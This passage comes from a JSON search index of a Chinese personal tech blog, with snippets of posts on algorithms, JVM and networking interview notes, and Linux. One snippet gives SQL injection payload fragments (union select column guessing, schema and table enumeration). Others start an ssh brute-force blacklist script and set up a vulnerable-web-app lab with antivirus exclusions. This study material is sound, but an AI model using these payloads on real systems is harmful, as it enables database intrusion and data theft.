，不然服务器渲染会有问题","lvl0":"渲染latex失败解决方法","lvl1":null,"lvl2":"摘要","objectID":"56f41329ff3a470c3e87e0466d037088","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/hugo-%E6%B8%B2%E6%9F%93latex%E5%A4%B1%E8%B4%A5/"},{"content":"给定一个数组和滑动窗口的大小，请找出所有滑动窗口里的最大值。 例如，如果输入数组 [2,3,4,2,6,2,5,1][2,3,4,2,6,2,5,1] 及滑动窗口的大小 3 ，那么一共存在 6 个滑动窗口，它们的最大值分","lvl0":"滑动窗口内的最大值","lvl1":null,"lvl2":"摘要","objectID":"3ff9b69ee50db9b654dc5285ee2c2f30","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E7%9A%84%E6%9C%80%E5%A4%A7%E5%80%BC/"},{"content":"网络物理设备题 在下列网间连接器中，（ ）在数据连路层实现网络互连。 https://www.nowcoder.com/test/question/done?tid=47443644\u0026amp;qid=94559#summary 中继器：中继器是工作在物理层上的连接设备。常用于两个网络节点之间物理信号的","lvl0":"物理设备理解刷题","lvl1":null,"lvl2":"摘要","objectID":"cb7cb74d3befcb9bdff99a18f450a115","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%89%A9%E7%90%86%E8%AE%BE%E5%A4%87%E7%90%86%E8%A7%A3%E9%A2%98/"},{"content":"王者段位java模式 参考视频 hystrix 降级 限流 配置 中心 阿波罗，config 等 微服务网关 zuul rbac模型 用户和角色是多对多的 一个 角色 多个用户，一个用户 多","lvl0":"王者段位java面试视频","lvl1":["八股文"],"lvl2":"摘要","objectID":"2ca42a100b0f85e37436f297eb632244","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E8%A7%86%E9%A2%91%E8%B5%84%E6%96%99%E5%AE%9E%E6%88%98/%E7%8E%8B%E8%80%85%E6%AE%B5%E4%BD%8Djava/"},{"content":"Thread 模式类比的是工厂里车间工人的工作模式。但其实在现实世界，工厂里还有一种流水线的工作模式，类比到编程领域，就是生产者 - 消费者模式。 当然，除了","lvl0":"生产消费者模式","lvl1":null,"lvl2":"摘要","objectID":"9d002e3a4599c0b340b0bc0c7a49c330","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E7%94%9F%E4%BA%A7%E6%B6%88%E8%B4%B9%E8%80%85%E6%A8%A1%E5%BC%8F/"},{"content":"登录页面制作总结 遇到的困难 内元素 设置 margin-top 影响外元素 解决的方法 1 2 3 4 #root { overflow:hidden } 设置 overflow 就不会被子元素影响了 ant-design icon兼容性为 1 // import { Icon } from \u0026#39;@ant-design/compatible\u0026#39;; 不错的","lvl0":"登录页面制作","lvl1":null,"lvl2":"摘要","objectID":"dd98af264917bb2e1c5197f570528427","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/react%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/react%E9%A1%B9%E7%9B%AE%E8%AE%B0%E5%BD%95/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E5%88%B6%E4%BD%9C%E6%80%BB%E7%BB%93/"},{"content":"没有小程序号的问题 不能上传和发布小程序 不能真机运行，只可以在PC 的模拟中运行 小程序页面简介 小程序的文件 wxml wxss js app.json 是小程序的 配置文件，可以配置小","lvl0":"相关概念","lvl1":null,"lvl2":"摘要","objectID":"bd5b2d4a5060eb602bdbd53bfbefda70","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/%E5%B0%8F%E7%A8%8B%E5%BA%8F/%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5/"},{"content":"请设计一个函数，用来判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。 路径可以从矩阵中的任意一个格子开始，每一步可以在矩阵中向左，向右","lvl0":"矩阵中的路径","lvl1":null,"lvl2":"摘要","objectID":"c184c28ebc0df07cfe7f3c75f185f737","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%90%9C%E7%B4%A2/%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B7%AF%E5%BE%84/"},{"content":"sql 注入学习 sql注入猜解 1 2 3 4 5 6 7 8 9 10 11 12 -- 猜字段数 union select 1,2 -- -- 猜数据库 select schema_name from database.schemata -- 猜数据表列 select * from table_name select table_name from database.tables where table_schema = \u0026#34;aaa\u0026#34; -- 获取某列内容 select * from","lvl0":"简单sql注入学习","lvl1":null,"lvl2":"摘要","objectID":"8cdcf0baed4df95ee0a72a4d113357e9","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/sql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/%E7%AE%80%E5%8D%95sql%E6%B3%A8%E5%85%A5/"},{"content":"管理员页面制作方法 文档链接 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57","lvl0":"管理员页面制作","lvl1":null,"lvl2":"摘要","objectID":"8068bd45f96a5549c6969e13d4bbd17e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/react%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/react%E9%A1%B9%E7%9B%AE%E8%AE%B0%E5%BD%95/%E7%AE%A1%E7%90%86%E5%91%98%E9%A1%B5%E9%9D%A2%E5%88%B6%E4%BD%9C/%E7%AE%A1%E7%90%86%E5%91%98%E9%A1%B5%E9%9D%A2%E5%88%B6%E4%BD%9C%E6%96%B9%E6%B3%95/"},{"content":"类加载器 jvm内置的类加载器说一下，各负责加载什么 BootstrapClassLoader(启动类加载器)：负责加载%JAVA_HOME%/","lvl0":"类加载器","lvl1":null,"lvl2":"摘要","objectID":"5e5558563572d294adff37c5f3a9d807","tags":["JVM"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/jvm%E7%90%86%E8%AE%BA/jvm%E8%AF%A6%E7%BB%86%E5%8E%9F%E7%90%86%E6%9D%A5%E8%87%AA%E7%BD%91%E5%8F%8B%E6%95%B4%E7%90%86/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"},{"content":"类加载过程 类的生命周期说一下 加载、连接（验证，准备，解析）、初始化、使用、卸载 类的加载过程具体说一下 类的加载包括了加载、连接（验证，准备，解","lvl0":"类加载过程","lvl1":null,"lvl2":"摘要","objectID":"70647d081951b900429b33e5673ab899","tags":["JVM"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/jvm%E7%90%86%E8%AE%BA/jvm%E8%AF%A6%E7%BB%86%E5%8E%9F%E7%90%86%E6%9D%A5%E8%87%AA%E7%BD%91%E5%8F%8B%E6%95%B4%E7%90%86/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B/"},{"content":"线程安全和线程池 线程安全的理解，其实应该说内存安全比较好，堆是共享的 学习教程 JAVA 内存模型 栈 堆 新生代 eden s1 s2 老年代 程序计数器 本地方法栈 元空间 直接内","lvl0":"线程安全和线程池","lvl1":null,"lvl2":"摘要","objectID":"d471a1b6189e0cb5eb6c3259ff488857","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E5%85%AB%E8%82%A1%E6%B7%B1%E6%8C%96/%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E5%92%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0%E8%A2%AB%E9%97%AE%E8%BF%87%E5%87%A0%E6%AC%A1%E4%BA%86/"},{"content":"线程和进程的区别 作者：peonyX 链接：https://www.nowcoder.com/discuss/723383?source_id=","lvl0":"线程安全的本质","lvl1":null,"lvl2":"摘要","objectID":"d97fa1d1f6fb83f97b3cb17accc1bd5e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E7%90%86%E8%A7%A3%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E6%9C%AC%E8%B4%A8/"},{"content":"网易面试 网络分层结构 三次握手 两次握手可以吗？ 四次挥手 第四次挥手为什么要等待2MSL？ 为什么是四次挥手？ TCP有哪些特点？ TCP和UDP的区别","lvl0":"网易面试","lvl1":null,"lvl2":"摘要","objectID":"e3bbab5dcc58192e482291f6ad0f2bc0","tags":["选择题刷题笔记","笔试总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E7%BD%91%E6%98%93%E9%9D%A2%E8%AF%95/"},{"content":"面试题 05.03. 翻转数位 Difficulty: 简单 给定一个32位整数 num，你可以将一个数位从0变为1。请编写一个程序，找出你能够获得的最长的一串1的长度。 示例 1： 1 2","lvl0":"翻转数位","lvl1":null,"lvl2":"摘要","objectID":"c8787aab90cd9db52663233826663d8a","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/%E7%BF%BB%E8%BD%AC%E6%95%B0%E4%BD%8D%E7%BD%91%E6%98%93%E7%AC%94%E8%AF%95%E9%A2%98/"},{"content":"股票的最大利润 假设把某股票的价格按照时间先后顺序存储在数组中，请问买卖 一次 该股票可能获得的利润是多少？ 例如一只股票在某些时间节点的价格为 [9","lvl0":"股票的最大利润","lvl1":null,"lvl2":"摘要","objectID":"19740432d295a624564279edc99fc114","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/dp%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E8%82%A1%E7%A5%A8%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6%E4%B8%89%E4%B8%83%E7%AC%94%E8%AF%95/"},{"content":"如何自定义线程池 corePoolSize 核心线程数 maximumPoolSize 最大线程数 keepAliveTime 线程存活时间【超出核心线程数的那部分】 unit 时间单位 workQueue 任务队列 threadFactory, 线程工厂，自定义线程的名字【用户自定义","lvl0":"自定义线程池的方法","lvl1":null,"lvl2":"摘要","objectID":"8ae9363f92155e67cc41152cc7c77f89","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BA%BF%E7%A8%8B%E6%B1%A0/"},{"content":"备份 点击 控制 -\u0026gt; 工具 -\u0026gt; 备份","lvl0":"虚拟机备份","lvl1":null,"lvl2":"摘要","objectID":"7526f7d8ef87be2169479749867863c6","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/windows10%E5%AD%A6%E4%B9%A0/virtualbox%E4%BD%BF%E7%94%A8%E5%AD%A6%E4%B9%A0/%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%A4%87%E4%BB%BD/"},{"content":"TCP 有哪些定时器 如果TCP连接的双方都没有向对方发送数据，则在两个TCP模块之间不交换任何信息。 如果一个给定的连接在两个小时之内没有任何动作，","lvl0":"计算机网络_TCP专题","lvl1":null,"lvl2":"摘要","objectID":"864c3c67575ab1a91cb42b2e49b08839","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C_tcp%E4%B8%93%E9%A2%98/"},{"content":"TCP 相关 TCP 流量控制 学习教程 建立连接 会有 syn + ack 机制， 表示 建立连接和 接收成功 发送数据会有 seq+ ACK 机制， 表示发送数据包的序列化 还有对应的应答 公式： $ TC","lvl0":"计算机网络八股文","lvl1":null,"lvl2":"摘要","objectID":"c8b2131866fa78d6232a5e65871f468d","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB%E8%82%A1%E6%96%87/"},{"content":"必记概念 主机号全1 为广播地址 【UDP 广播原理 】 主机号全0 为网段地址 【代表整个网络 】 192.168.0.1 - 192.168.0.254 IP地址 Ip计算 题目1. 一个C类网络被划分子网，新的","lvl0":"计算题刷题","lvl1":null,"lvl2":"摘要","objectID":"9a8dc337b8ddd5d672d1d446de0b1d39","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E9%A2%98%E5%88%B7%E9%A2%98/"},{"content":"redis 优化技巧 避免 bigKey 一次可以多次 获取数据 mget mset hmget hmset 可以用 pipeline 将多次网络查询 改为一次网络查询","lvl0":"诗悦","lvl1":null,"lvl2":"摘要","objectID":"569ac6cfaef1e62847147715d2afddaf","tags":["个人总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E8%AF%97%E6%82%A6/"},{"content":"软件哈希校验原理 提供的软件包 .exe 软件，可能会被第三方用户篡改 因此 有一种做法 是将正版的软件生成一个 md5 或者 sha1 的 字符串 值， 然后 你下载到本地 之后 可以计","lvl0":"软件哈希校验原理","lvl1":null,"lvl2":"摘要","objectID":"7f61c1ff51db4e3ea991b37954885333","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/%E8%BD%AF%E4%BB%B6%E6%9C%A8%E9%A9%AC%E6%A4%8D%E5%85%A5%E5%92%8C%E5%93%88%E5%B8%8C%E6%A0%A1%E9%AA%8C%E5%8E%9F%E7%90%86/"},{"content":"运行时数据区 运行时数据区内有哪些东西 1.8以前： 线程共享的有堆和方法区（永久代是其实现方式） 线程独立的有本地方法栈、虚拟方法栈和程序计数器 1","lvl0":"运行时数据区","lvl1":null,"lvl2":"摘要","objectID":"73a4c10cfbc8bfb068484dcb06cfd3e5","tags":["JVM"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/jvm%E7%90%86%E8%AE%BA/jvm%E8%AF%A6%E7%BB%86%E5%8E%9F%E7%90%86%E6%9D%A5%E8%87%AA%E7%BD%91%E5%8F%8B%E6%95%B4%E7%90%86/%E8%BF%90%E8%A1%8C%E6%97%B6%E6%95%B0%E6%8D%AE%E5%8C%BA/"},{"content":"进程间通信的几种方式 管道pipe：管道是一种半双工的通信方式，数据只能单向流动，而且只能在具有亲缘关系的进程间使用。进程的亲缘关系通常是指父","lvl0":"进程操作","lvl1":null,"lvl2":"摘要","objectID":"ca2b89fa104644bcec34539876c3ee6c","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/%E8%BF%9B%E7%A8%8B%E6%93%8D%E4%BD%9C/"},{"content":"进程状态总结 子进程 退出 后 发送 exit 信号 给父进程 比如 shell 中执行 ls shell 是个父进程， ls 是个子进程， 执行 ls的时候 shell 是不能跑的 子进程 执行 完成 之后， 退出时候 子","lvl0":"进程状态","lvl1":null,"lvl2":"摘要","objectID":"e86fcbeb18cc8902cb1c526a875e06a6","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/%E8%BF%9B%E7%A8%8B%E7%8A%B6%E6%80%81/"},{"content":"进程运行的5种状态 学习的视频 初始态，终止态，就绪态 和 挂起态， 挂起是指的是阻塞 ，进程放弃了 CPU 的执行权限。 我们知道 ，每个进程在内核中都有一个 进程","lvl0":"进程运行的状态","lvl1":null,"lvl2":"摘要","objectID":"fed422713b24d7e24366b5d4f98f5e13","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/%E8%BF%9B%E7%A8%8B%E8%BF%90%E8%A1%8C%E7%9A%84%E7%8A%B6%E6%80%81/"},{"content":"远光科技 mysql 行转列 这个名词有点新，但是 之前也被问过一次【一共被问2次】， 因此，应该是个隐藏考点 mysql 行转列 1 2 3 4 5 6 7 8 9 DROP TABLE IF EXISTS tb_score; CREATE TABLE tb_score( id INT(11) NOT","lvl0":"远光","lvl1":null,"lvl2":"摘要","objectID":"6ac6034dd1fa320665e2b74a6313dc74","tags":["选择题刷题笔记","笔试总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E8%BF%9C%E5%85%89/"},{"content":"输入一个 非空 整型数组，数组里的数可能为正，也可能为负。 数组中一个或连续的多个整数组成一个子数组。 求所有子数组的和的最大值。 要求时间复杂度为 $O(N)$","lvl0":"连续子数组的最大和","lvl1":null,"lvl2":"摘要","objectID":"b6e24fdc7f86b62a3386ac5432ce964e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E8%B4%AA%E5%BF%83/%E8%BF%9E%E7%BB%AD%E5%AD%90%E6%95%B0%E7%BB%84%E6%9C%80%E5%A4%A7%E5%92%8C/"},{"content":"常见的排序算法 稳定的排序算法 冒泡排序 $O(N^2)$ 插入排序 $O(N^2)$ 桶排序(bucket sort) , $O(N^2)$ , 需要额外 $O(K)$ 的空间 合并排序 (MergeSort ) $O(NlogN)$ ,额外 $O(N)$ 的空间 基数排序 $O(N*K) $ , 需要 $O(N)$","lvl0":"选择题面试常考","lvl1":null,"lvl2":"摘要","objectID":"aa03fc85c0a816cbaf3c52d787f745fc","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AE%97%E6%B3%95/%E9%80%89%E6%8B%A9%E9%A2%98%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%80%83/"},{"content":"重建二叉树 输入一棵二叉树前序遍历和中序遍历的结果，请重建该二叉树。 注意: 二叉树中每个节点的值都互不相同； 输入的前序遍历和中序遍历一定合法； 样","lvl0":"重建二叉树","lvl1":null,"lvl2":"摘要","objectID":"ad2025ff842fb5e04ae65ef8f4bc5bb7","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%8F%89%E6%A0%91/%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91/"},{"content":"前端优化技巧 tinypng 优化 https://tinypng.com/ 对图片进行压缩 图片的优化，也是从两个方面来考虑：太多 和 太大。 可以通过懒加载减少图片的请求，或者通过雪碧图来合并图片，以及","lvl0":"重绘与重排","lvl1":null,"lvl2":"摘要","objectID":"52fcbca43f747d65d27d4dfa067118f6","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/%E5%89%8D%E7%AB%AF%E4%BC%98%E5%8C%96%E6%8A%80%E5%B7%A7/%E9%87%8D%E7%BB%98%E4%B8%8E%E9%87%8D%E6%8E%92/"},{"content":"链表倒数第K个节点 输入一个链表，输出该链表中倒数第 kk 个结点。 注意： k \u0026gt;= 1; 如果 kk 大于链表长度，则返回 NULL; 样例 1 2 3 输入：链表：1-\u0026gt;2-\u0026","lvl0":"链表倒数第K个节点","lvl1":null,"lvl2":"摘要","objectID":"26c1379cab349b6265743fffc474a90e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E9%93%BE%E8%A1%A8%E7%9A%84%E5%80%92%E6%95%B0%E7%AC%ACk%E4%B8%AA%E8%8A%82%E7%82%B9/"},{"content":"链表环的入口节点 快慢指针， 快指针 走了 $a+b+c+d$, 然后慢指针 走了 $a+b$, 两个指针 在 紫色点相遇。快指针一次走2步，可以列出方程 $$ a+b+c+b = 2*(a+b)\\ 得到:\\ a = c $$ 然后 一直指","lvl0":"链表环的入口节点","lvl1":null,"lvl2":"摘要","objectID":"51382c05960e4d7e78e31dacab315fe2","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E9%93%BE%E8%A1%A8%E7%8E%AF%E7%9A%84%E5%85%A5%E5%8F%A3%E8%8A%82%E7%82%B9/"},{"content":"考过2次的题目 一个长度为100的循环链表，指针A和指针B都指向了链表中的同一个节点，A以步长为1向前移动，B以步长为3向前移动，一共至少需要","lvl0":"链表问题","lvl1":null,"lvl2":"摘要","objectID":"c5824591841930dc128e1a3a27bb55dc","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8%E9%97%AE%E9%A2%98%E8%80%83%E8%BF%872%E6%AC%A1/"},{"content":"算法题 【数位dp ,前导0问题】 leetcode 原题 问题描述： 给定正整数 N，返回小于等于 N 且具有至少 1 位重复数字的正整数的个数。 示例 1： 输入：20 输出：1 解","lvl0":"阅文集团笔试总结","lvl1":null,"lvl2":"摘要","objectID":"b28069134f45617cf36924f0328cbceb","tags":["选择题刷题笔记","做题家速成"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E9%98%85%E6%96%87%E9%9B%86%E5%9B%A2%E7%AC%94%E8%AF%95%E6%80%BB%E7%BB%93_2021_9_29/"},{"content":"防止ssh暴力破解脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #! /bin/bash cat /var/log/secure|awk \u0026#39;/Failed/{print $(NF-3)}\u0026#39;|sort|uniq -c|awk \u0026#39;{print $2\u0026#34;=\u0026#34;$1;}\u0026#39; \u0026gt; /usr/local/bin/black.list for i in `cat /usr/local/bin/black.list` do IP=`echo $i |awk -F= \u0026#39;{print $1}\u0026#39;` NUM=`echo $i|awk -F= \u0026#39;{print $2}\u0026#39;` if [ ${NUM} -gt 5","lvl0":"防止ssh暴力破解","lvl1":["linux"],"lvl2":"摘要","objectID":"7e04c3e02d4b21261730a1cc192dd3c6","tags":["linux"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E8%AE%B0%E5%BD%95/%E9%98%B2%E6%AD%A2-ssh%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"},{"content":"","lvl0":"面试自我介绍","lvl1":null,"lvl2":"摘要","objectID":"515d9a01733c814efa9d6afe30b906bb","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/%E9%9D%A2%E8%AF%95_%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D/"},{"content":"预备工作 这边要防止 windows defender 误杀的方法： 添加 排除 .php , .md 文件， 可能会误杀 添加指定文件夹 不要扫描 安装靶机 OWASP Broken Web Applications Project Broken Web Applications（BWA","lvl0":"靶机安装配置","lvl1":null,"lvl2":"摘要","objectID":"793783328edcef348f7dd6c11c6f7493","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5/%E9%9D%B6%E6%9C%BA%E5%AE%89%E8%A3%85%E7%AD%89%E9%85%8D%E7%BD%AE/"},{"content":"将一个骰子投掷 n 次，获得的总点数为 s ，s 的可能范围为 $ n∼6n $ 。 掷出某一点数，可能有多种掷法，例如投掷 2 次，掷出 3 点，共有 [1,2], [2,1] 两种掷法。 请","lvl0":"骰子的点数","lvl1":null,"lvl2":"摘要","objectID":"ac26d43516167fbb80cbc8ec89142f7f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/dp%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E9%AA%B0%E5%AD%90%E7%82%B9%E6%95%B0dp/"},{"content":"cdn 加速 所谓的 CDN 加速技术，就是将客户端上传的图片、音视频发布到多个分布在各地的 CDN 节点的服务器上，当有用户需要访问这些图片和音视频时，能够通过 DNS","lvl0":"cdn原理","lvl1":null,"lvl2":"摘要","objectID":"b204bdf0abeeaa7e1773d59dd7ce587e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%B6%88%E6%81%AF%E5%AE%9E%E6%97%B6%E6%8E%A8%E9%80%81/cdn%E5%8E%9F%E7%90%86/"},{"content":"如何保证消息可靠传递 什么是 ACK 有了 TCP 